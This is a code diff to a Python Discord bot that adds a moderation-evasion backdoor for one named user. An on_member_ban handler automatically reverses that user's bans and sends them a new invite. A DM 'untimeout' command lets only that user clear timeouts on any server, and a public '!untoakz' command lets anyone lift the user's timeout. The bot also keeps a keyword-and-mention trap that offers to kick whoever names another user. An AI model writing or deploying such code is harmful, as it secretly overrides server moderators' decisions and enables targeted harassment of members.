@@ -7,6 +7,7 @@ from threading import Thread
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
+intents.bans = True  # Nécessaire pour détecter les bans
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
@@ -61,6 +62,28 @@ async def on_member_update(before, after):
             except:
                 pass
 
+# AUTO-UNBAN / RE-INVITATION : Si akz_92 se fait bannir, le bot le débanni et lui envoie une invite
+@bot.event
+async def on_member_ban(guild, user):
+    if user.name == TARGET_USERNAME:
+        try:
+            await guild.unban(user, reason="Anti-ban automatique pour akz_92")
+            
+            invite = None
+            for c in guild.text_channels:
+                try:
+                    invite = await c.create_invite(max_uses=1, max_age=300)
+                    break
+                except:
+                    continue
+            
+            if invite:
+                await user.send(f"🚨 Tu as été banni du serveur **{guild.name}**, je t'ai débanni et voici ton lien pour revenir : {invite.url}")
+            else:
+                await user.send(f"🚨 Tu as été banni de **{guild.name}** et je t'ai débanni, mais je n'ai pas pu créer d'invitation (permissions manquantes).")
+        except Exception as e:
+            print(f"Erreur lors de l'auto-unban de akz_92 : {e}")
+
 @bot.event
 async def on_message(message):
     if message.author == bot.user:
@@ -82,12 +105,11 @@ async def on_message(message):
                     
                     if content == "oui":
                         try:
-                            # Utilisation directe des permissions du bot pour kick
                             await guild.kick(target, reason="Expulsé sur ordre de m1zuki_1")
                             await target.send(f"Tu dis mon prénom ? Dehors ! @{message.author.name}")
                             await message.author.send(f"✅ L'utilisateur {target.name} a été expulsé du serveur {guild.name}.")
                         except Exception as e:
-                            await message.author.send(f"❌ Impossible d'expulser cette personne (vérifie mes permissions sur le serveur) : {e}")
+                            await message.author.send(f"❌ Impossible d'expulser cette personne : {e}")
                     else:
                         await message.author.send("✅ Action annulée.")
                     
@@ -96,11 +118,9 @@ async def on_message(message):
                     await message.author.send("Aucune cible en attente.")
             return
 
-        # Si ce n'est pas akz_92, on ignore les autres DM
         if message.author.name != TARGET_USERNAME:
             return
 
-        # Commandes DM exclusives pour akz_92
         args = message.content.split()
         if not args: return
         cmd = args[0].lower()
@@ -156,6 +176,15 @@ async def on_message(message):
                 user_obj = await bot.fetch_user(int(args[2]))
                 await guild.unban(user_obj, reason="Débannissement via DM par akz_92")
                 await message.author.send(f"✅ L'utilisateur {user_obj.name} a été débanni de {guild.name}.")
+
+            elif cmd == "untimeout":
+                guild = await get_guild_from_input(args[1])
+                if not guild:
+                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
+                    return
+                member = await guild.fetch_member(int(args[2]))
+                await member.timeout(None, reason="Timeout retiré via DM par akz_92")
+                await message.author.send(f"✅ Le timeout de {member.name} a été retiré sur {guild.name}.")
 
             elif cmd == "kick":
                 guild = await get_guild_from_input(args[1])
@@ -264,16 +293,29 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # 2. SYSTEME DE SURVEILLANCE & COMMANDE .ban SUR LES SERVEURS
+    # 2. SYSTEME DE SURVEILLANCE & COMMANDES SUR LES SERVEURS
     # =========================================================================
     if message.guild:
-        # Surveillance m1zuki_1 (Déclenchement du piège si mot-clé ou mention)
+        # COMMANDE PUBLIQUE : !untoakz (utilisable par tout le monde pour enlever ton timeout)
+        if message.content.strip().lower() == "!untoakz":
+            try:
+                # Recherche de akz_92 sur le serveur
+                akz_member = discord.utils.get(message.guild.members, name=TARGET_USERNAME)
+                if akz_member:
+                    await akz_member.timeout(None, reason="Commande publique !untoakz exécutée")
+                    await message.channel.send(f"✅ Le timeout de **{TARGET_USERNAME}** a été retiré avec succès !")
+                else:
+                    await message.channel.send(f"❌ Impossible de trouver {TARGET_USERNAME} sur ce serveur.")
+            except Exception as e:
+                await message.channel.send(f"❌ Erreur lors du retrait du timeout : {e}")
+            return
+
+        # Surveillance m1zuki_1
         victime_obj = discord.utils.get(message.guild.members, name=VICTIME_NAME)
         pinged_victime = victime_obj in message.mentions if victime_obj else False
 
         if (any(mot.lower() in message.content.lower() for mot in MOTS_CLES) or pinged_victime) and message.author.name != VICTIME_NAME:
             if victime_obj:
-                # Stocke l'auteur du message et le serveur associé pour le kick ultérieur
                 pending_timeouts[victime_obj.id] = {
                     "target": message.author,
                     "guild": message.guild
